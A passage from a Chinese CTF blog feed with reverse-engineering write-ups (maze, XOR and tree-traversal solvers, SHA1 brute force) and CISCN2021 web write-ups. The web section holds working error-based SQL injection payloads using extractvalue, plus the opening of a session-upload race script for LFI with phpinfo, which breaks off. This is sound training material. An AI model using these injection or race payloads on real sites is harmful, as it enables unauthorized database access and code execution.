class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">**########################################################################################</span><br><span class="line">#*######################*******************************************#####*************#####</span><br><span class="line">#************************####*####################################*#####*###########*#####</span><br><span class="line">#########*#########*#########*#######***************************##*#####*###########*#####</span><br><span class="line">#******##*#########*#########*#######*#########################*##*#####*###########*#####</span><br><span class="line">#*####*##*#########*#########*#######*#########################*##*#####********####*#####</span><br><span class="line">#*####*##*#########*######*******####*###**********####****####*##*############*####*#####</span><br><span class="line">#*##***#**#########*#################*###*########*####*#######*##*############*####*#####</span><br><span class="line">#*##*###*##########*##############****###*******##*####*#######*##*##*****#####*####*#####</span><br><span class="line">#*##*###*##########*##############*############*##*####*#######*##*##*###*#####*####*#####</span><br><span class="line">#************######*##############**************##*####*#######*##*##*###*#####*####*#####</span><br><span class="line">###################*##############################*####***#####*##*##*###*#####*####*#####</span><br><span class="line">###################********************************############*##*##*###*#####*####*#####</span><br><span class="line">###############################################################*##*##*###*#####*####*#####</span><br><span class="line">###***************************************************#########*##*##*###*#####*####*#####</span><br><span class="line">###*#################################################*#########*##*######*#####*####*#####</span><br><span class="line">###*####*****#####**********************#############*#########*##********#####*####*#####</span><br><span class="line">###*####*###*#####*####################***************#########*###############*####*#####</span><br><span class="line">###*####*###*#####*############################################*****************####*#####</span><br><span class="line">###******###*#####*#################################################################*#####</span><br><span class="line">############*#####*******************************************************************#####</span><br><span class="line">###**********#############################################################################</span><br><span class="line">###*#########*****************************************************************############</span><br><span class="line">###*#########*###############################################*############################</span><br><span class="line">###*#########*###############################################*######*****************#####</span><br><span class="line">###**************************************************########*######*#####################</span><br><span class="line">#############################################################*######*#####################</span><br><span class="line">#############################################################*######*#####################</span><br><span class="line">#########################*****************************************************************</span><br></pre></td></tr></table></figure><p><img src="/2021/10/08/ctfwiki-re/1.PNG"></p><blockquote><p>RDDRRRRRRRRRRRRRRRRRRDDDDDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRUUUUUULLLLLLLLLDDRRRRRRDDLLLLLLLLLLLLLUURRRUUUUURRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDDDDDDDDDDRRRRRRRRRRRRRRRRUUUUUUUUUUUUULLLLLLLUUUURRRRRRRRRRRRDDDDDDDDDDDDDDDDDDDLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLUUUURRRRRRRRRRRRRRRRRRRRRDRRRRRRRRRRRRRRUUULLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLDDDDDRRRRRUUURRRRDDDDDLLLLLLLLLDDDDRRRRRRRRRRUUURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRR</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu-re-2</title>
      <link href="2021/10/08/buu-re-2/"/>
      <url>2021/10/08/buu-re-2/</url>
      
        <content type="html"><![CDATA[<h1 id="Oruga"><a href="#Oruga" class="headerlink" title="Oruga"></a>Oruga</h1><p>64位程序，无壳，拖入ida中反编译</p><p><img src="/2021/10/08/buu-re-2/1.PNG"></p><p>flag前五位应为actf{，然后查看sub_78A</p><h2 id="sub-78A"><a href="#sub-78A" class="headerlink" title="sub_78A"></a>sub_78A</h2><p><img src="/2021/10/08/buu-re-2/2.PNG"><br><img src="/2021/10/08/buu-re-2/3.PNG"></p><p>看了别人的思路才知道是迷宫<br>从左上角开始，到！结束，在16进制试图下查看更明显</p><p><img src="/2021/10/08/buu-re-2/4.PNG"></p><p>走完迷宫即可得到flag</p><blockquote><p>flag{MEWEMEWJMEWJM}</p></blockquote><h1 id="easy-strcmp"><a href="#easy-strcmp" class="headerlink" title="easy strcmp"></a>easy strcmp</h1><p>64位程序，无壳<br>查看main函数</p><p><img src="/2021/10/08/buu-re-2/5.PNG"></p><p>除了一个比较找不到其他信息，查看其余函数，sub_6EA具有明显逻辑。</p><p><img src="/2021/10/08/buu-re-2/6.PNG"></p><p>一个减法运算，写脚本解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag[<span class="number">24</span>] = &#123;<span class="number">0x42</span>, <span class="number">0x09</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x35</span>, <span class="number">0x43</span>, <span class="number">0x0A</span>, <span class="number">0x41</span>, <span class="number">0xF0</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x2B</span>, <span class="number">0x28</span>, <span class="number">0x35</span>, <span class="number">0x4A</span>, <span class="number">0x06</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x4F</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> str[<span class="number">24</span>] = &#123;<span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x4E</span>, <span class="number">0x53</span>, <span class="number">0x4F</span>, <span class="number">0x52</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] += str[i];</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">9</span>||i==<span class="number">11</span>||i==<span class="number">13</span>||i==<span class="number">14</span>)</span><br><span class="line">            flag[i]+=<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么要在第i=9、11、13、14时进行+1，我也不明白，看看这两篇文章或许你就能明白。<br><a href="https://blog.csdn.net/Tokameine/article/details/118148770?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">文章1</a><br><a href="https://ctftime.org/writeup/18785">文章2</a></p><blockquote><p>flag{l3ts_m4k3_4_DETOUR_t0d4y}</p></blockquote><h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>在虚拟机里运行一下，出现两端类似flag的字符串</p><p><img src="/2021/10/08/buu-re-2/7.PNG"></p><p>文件为64位，放入ida中查看main函数</p><p><img src="/2021/10/08/buu-re-2/8.PNG"></p><p>函数type1与type2应该我加密函数，点进去</p><p><img src="/2021/10/08/buu-re-2/9.PNG"><br><img src="/2021/10/08/buu-re-2/10.PNG"></p><p>再加上main函数中的那些描述语句，可猜测这是二叉树，type1为中序遍历，type2为后续遍历<br>网上随便抄个脚本<a href="https://blog.csdn.net/qq_34950042/article/details/103738130">链接</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">假设根节点在中序遍历中的位置为pos，树的结点数为len，即 len=inorder.length()</span></span><br><span class="line"><span class="comment">代码：pos = inorder.find(preorder[0]) or pos = inorder.find(postorder[postorder.size()-1])</span></span><br><span class="line"><span class="comment">先序遍历(NLR), 根节点编号(0), 左子树编号(1~pos), 右子树编号(pos+1~len-1)</span></span><br><span class="line"><span class="comment">中序遍历(LNR), 左子树编号(0~pos-1), 根节点编号(pos), 右子树编号(pos+1~len-1)</span></span><br><span class="line"><span class="comment">后序遍历(LRN), 左子树编号(0~pos-1), 右子树编号(pos~len-2), 根点编号(len-1)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(<span class="built_in">string</span> preorder,<span class="built_in">string</span> inorder)</span></span>&#123;<span class="comment">//由先序遍历+中序遍历序列，递归实现后序遍历 (LRN)</span></span><br><span class="line">    <span class="keyword">int</span> len = preorder.length();</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span>)</span><br><span class="line">    &#123;  <span class="comment">//单个结点</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;preorder[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> pos=inorder.find(preorder[<span class="number">0</span>]);   <span class="comment">// 查找根节点在中序序列中的位置，通过根节点划分左右子树</span></span><br><span class="line">    <span class="comment">// 类似于后序遍历过程</span></span><br><span class="line">    postorder(preorder.substr(<span class="number">1</span>,pos), inorder.substr(<span class="number">0</span>,pos));<span class="comment">//后序遍历左子树</span></span><br><span class="line">    postorder(preorder.substr(pos+<span class="number">1</span>,len-pos<span class="number">-1</span>), inorder.substr(pos+<span class="number">1</span>,len-pos<span class="number">-1</span>));<span class="comment">//后序遍历右子树，pos从0开始，所以len-pos-1</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;preorder[<span class="number">0</span>];    <span class="comment">//最后输出根节点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(<span class="built_in">string</span> inorder, <span class="built_in">string</span> postorder)</span> <span class="comment">//由中序遍历+后序遍历序列，递归实现先序序列 (NLR)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = postorder.length();</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) <span class="comment">// 空树</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(len == <span class="number">1</span>)   <span class="comment">// 单个结点</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;inorder[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> pos = inorder.find(postorder[len<span class="number">-1</span>]);</span><br><span class="line">    <span class="comment">// 类似于先序遍历过程</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;postorder[len<span class="number">-1</span>];</span><br><span class="line">    preorder(inorder.substr(<span class="number">0</span>, pos),  postorder.substr(<span class="number">0</span>, pos)); <span class="comment">//先序遍历左子树</span></span><br><span class="line">    preorder(inorder.substr(pos+<span class="number">1</span>, len-pos<span class="number">-1</span>), postorder.substr(pos, len-pos<span class="number">-1</span>));<span class="comment">//先序遍历右子树</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s1,s2;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s1&gt;&gt;s2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//postorder(s1,s2);           //由先序遍历+中序遍历序列，递归实现后序遍历</span></span><br><span class="line">        preorder(s1, s2);           <span class="comment">//由中序遍历+后序遍历序列，递归实现先序序列</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{This_IS_A_7reE}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu-re-1</title>
      <link href="2021/10/08/buu-re-1/"/>
      <url>2021/10/08/buu-re-1/</url>
      
        <content type="html"><![CDATA[<h1 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h1><p>32位程序，无壳，直接ida32反编译。</p><h2 id="第一次输入"><a href="#第一次输入" class="headerlink" title="第一次输入"></a>第一次输入</h2><p><img src="/2021/10/08/buu-re-1/1.png"><br><img src="/2021/10/08/buu-re-1/2.png"></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id">hash标识符官网查询</a><br>根据对destination的限制可对其进行爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag=<span class="string">&quot;@DBApp&quot;</span></span><br><span class="line">str1=<span class="string">&quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>,<span class="number">999999</span>):</span><br><span class="line">    str2 = hashlib.sha1((<span class="built_in">str</span>(i)+flag).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    str3 = str2.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> str1 == str3:</span><br><span class="line">            <span class="built_in">print</span> (<span class="built_in">str</span>(i)+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可得出结果为123321<br>然后查看下面的内容</p><h2 id="第二次输入"><a href="#第二次输入" class="headerlink" title="第二次输入"></a>第二次输入</h2><p><img src="/2021/10/08/buu-re-1/3.png"><br><img src="/2021/10/08/buu-re-1/4.png"></p><p>此处的md5加密进行爆破很困难，但下面还有一个验证函数，进去查看。<br>网上查看了多篇博客，知道了基本原理。</p><p><img src="/2021/10/08/buu-re-1/5.png"><br><a href="https://www.cnblogs.com/palmer0801/p/12111821.html">图片来源</a></p><p>里面还有一个小函数</p><p><img src="/2021/10/08/buu-re-1/6.PNG"></p><p>从AAA中提取的信息与输入进行异或<br>使用Resource_Hacker打开程序</p><p><img src="/2021/10/08/buu-re-1/7.PNG"></p><p>异或的结果保存到dbapp.rtf中，所以要读取他里面的内容，并与前六位异或，就可以得到原先的值<br>.rtf开头都是{\rtf1\ansi  取其前六位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">0x05</span>,<span class="number">0x7D</span>,<span class="number">0x41</span>,<span class="number">0x15</span>,<span class="number">0x26</span>,<span class="number">0x01</span>]</span><br><span class="line">s = <span class="string">&quot;&#123;\\rtf1&quot;</span></span><br><span class="line">b = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    x = <span class="built_in">ord</span>(s[i]) ^ a[i]</span><br><span class="line">    b+=<span class="built_in">chr</span>(x)</span><br><span class="line">print(b)</span><br><span class="line"><span class="comment">#得到~!3a@0，输入到程序后会得到一个名为dbapp.rtf的文件，打开获得flag。</span></span><br></pre></td></tr></table></figure><blockquote><p>Flag{N0_M0re_Free_Bugs}</p></blockquote><h1 id="Youngter-drive"><a href="#Youngter-drive" class="headerlink" title="Youngter-drive"></a>Youngter-drive</h1><p>32位程序，有upx壳，脱去，再放入ida<br>查看main函数</p><p><img src="/2021/10/08/buu-re-1/8.PNG"></p><p>里面创建了两个线程，先执行线程1，再执行线程2，循环往复。</p><h2 id="线程1"><a href="#线程1" class="headerlink" title="线程1"></a>线程1</h2><p><img src="/2021/10/08/buu-re-1/9.PNG"><br><img src="/2021/10/08/buu-re-1/10.PNG"></p><h2 id="线程2"><a href="#线程2" class="headerlink" title="线程2"></a>线程2</h2><p><img src="/2021/10/08/buu-re-1/11.PNG"></p><p>里面没有什么东西</p><h2 id="验证函数"><a href="#验证函数" class="headerlink" title="验证函数"></a>验证函数</h2><p><img src="/2021/10/08/buu-re-1/12.PNG"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> dword_418008[] =  <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasd&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> off_418004[] = <span class="string">&quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">29</span>];</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">28</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            flag[i]=off_418004[i];</span><br><span class="line">           <span class="comment">// printf(&quot;%d:%c\n&quot;,i,flag[i]);</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">52</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(off_418004[i]==dword_418008[j])</span><br><span class="line">            &#123;</span><br><span class="line">                flag[i] = j+ <span class="number">38</span>;</span><br><span class="line">                <span class="keyword">if</span>(!(flag[i]&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;flag[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">                    flag[i] = j + <span class="number">96</span>;</span><br><span class="line">                <span class="comment">//break;</span></span><br><span class="line">               <span class="comment">// printf(&quot;%d:%c\n&quot;,i,flag[i]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,flag);</span><br><span class="line">    <span class="comment">//for(i=0;i&lt;29;i++)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只得到了29，但最后一个可以试出来，为E</p><blockquote><p>flag{ThisisthreadofwindowshahaIsESE}</p></blockquote><h1 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h1><p>apk逆向，不是很懂，看别人的wp，通过搜索字符串转到关键信息处，ida打开so文件，base58解密获得邮箱.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOs报错记录</title>
      <link href="2021/09/24/CentOs%E6%8A%A5%E9%94%99%E8%AE%B0%E5%BD%95/"/>
      <url>2021/09/24/CentOs%E6%8A%A5%E9%94%99%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="071fb79cd68f01b7a0263b846c007b44c2462036723a19af4d09b3788673103c">846031f3c0e2d4bcbb4508084706789f834894ad249960b41c5c6cf21d9a26da267ebcceb1edbd70c69be959f2c6a093aa2895f06c76f861f341fada79c65e1853cb4ec27aab58be87e58f8e36b318260f1fb45232f420e1322457b7452331e35c6e3283f6ffdf0f5d4c89e552230e16f76675aca85fc70e2bd92f553fbdfefa4d4b4863a25095111334b45d535c6826d158dd1cbbdf839491df2f89c4f0e471d4435c8c8e61f050e5641131b8f6df10139fe4e49e0ff592d028a2a324f75f795374759fa0dbb37cb84ef5247cc9e98e777d1c30295d4a9c9d016040b1698d9c2bf31e5a1e79ce30e8088c250253ba537f6f6c11dd45a03c22178fa52e17d8af1bc8be2b7147bb01e0c9cbcb8c26617f0e87a20a104f69ef50f38f356a70be03f46b3bfb9112d936f0f98006d90cf4ec9c14d0e8d71e496a04d9ceb016cd4b865a663f576a2be885477eaf00225cf39194ba1dbb70045430c95b7269a3b7dd2b815c4f5a929e4aa514306fa8c3fb6ade5439608abe09a1b49580d1135a9c69a205fde443b3ba8890a50ba1a7ea0c420a205d6771b7e02fd38f86a71027767f3becf52188272869f9daddbbc279dcd29fe2af0f3b0ebcdcae1d375ac9a5ba000df0ded8d630769f004b60a73c61b22a4e066a5338330be0c17f608445e746c0d9cc6a947e38de63d09685b6ae2a8c5724b5d29dc9bffee923eb5a2af75c8e4479f7c6d00aa7a8dbbbfe6c4db079bff1cef6d44c6d1a71e09a8c8dd56c55ebcf143e3fa2d1ab90e68e59ebe71cf49c992a657e0ddb5651c0f6815966f04ef0e3dad41d81f51619a3c40b8ebd9a7e63496bd3581201f8cfcdcbb2736707a7cb9459f385b257741ab45bf9439cbd3f2199b5e0a9877f848e0d49589f05741b1e5232acf192abfbdb9436abeb5bbbf5172e0a490241e568ddf815d4f2c3f30cb4b5e87b40363bc6b1d4581dac40b8fa1db37186a5c8374dc85b2a9a2541924d7ef2d6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2021</title>
      <link href="2021/05/16/CISCN2021/"/>
      <url>2021/05/16/CISCN2021/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><a id="more"></a><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy-sql"></a>easy-sql</h2><p>盲注，有报错：(‘’) and password=(‘’) LIMIT 0,1’ at line 1</p><p>写脚本</p><p>发现过滤了information</p><p>库：security</p><p>猜出表名 flag</p><p>选择报错注入 join，as爆列名</p><p>id no</p><p>d8088756-a82f-486a-a31c-8032d1590bff</p><p>试了好几遍，原来是列……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;)and(select extractvalue(0x0a,concat(0x0a,(select (select substr(group_concat(&#96;d8088756-a82f-486a-a31c-8032d1590bff&#96;),1,20) from flag)))))#&amp;passwd&#x3D;&amp;Submit&#x3D;%E7%99%BB%E5%BD%95</span><br><span class="line"></span><br><span class="line">uname&#x3D;&#39;)and(select extractvalue(0x0a,concat(0x0a,(select (select substr(group_concat(&#96;d8088756-a82f-486a-a31c-8032d1590bff&#96;),20,30) from flag)))))#&amp;passwd&#x3D;&amp;Submit&#x3D;%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p>多次出flag</p><blockquote><p>CISCN{Qn1ik-Q9MLB-pNYUn-Ye8VA-tdAX3-}</p></blockquote><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>发现备份文件：.index.php.swo</p><p>flag应该是藏在了注释里，应该是用php自带类库</p><p>PHP通过反射类ReflectionMethod和getDocComment 获取注释返回</p><p><a href="http://www.haimengli.com/php-tong-guo-fan-she-lei/?fileGuid=cKDQRHCPv6VjxWKx">http://www.haimengli.com/php-tong-guo-fan-she-lei/</a></p><p><img src="/2021/05/16/CISCN2021/1.png"></p><p>爆破各个函数</p><p><img src="/2021/05/16/CISCN2021/2.png"></p><blockquote><p>CISCN{rGDvG-RKMy5-dJWt3-KCIh8-3xzZp-}</p></blockquote><h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p><img src="/2021/05/16/CISCN2021/3.png"></p><p>扫出/.listing文件</p><p><img src="/2021/05/16/CISCN2021/4.png"></p><p><img src="/2021/05/16/CISCN2021/5.png"></p><p>提供了phpinfo页面，结合文件包含：LFI with PHPInfo</p><p>awsl,phpinfo+lfi的脚本好难搞，我又菜……</p><p>搜索一波，可以借助phpinfo提供的sessionpath完成session文件上传竞争</p><p>这个脚本比较好找……好改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">sessid &#x3D; &#39;test&#39;</span><br><span class="line"></span><br><span class="line">def t1(session):</span><br><span class="line">    while True:</span><br><span class="line">        f &#x3D; &quot;&quot;</span><br><span class="line">        response &#x3D; requests.post(</span><br><span 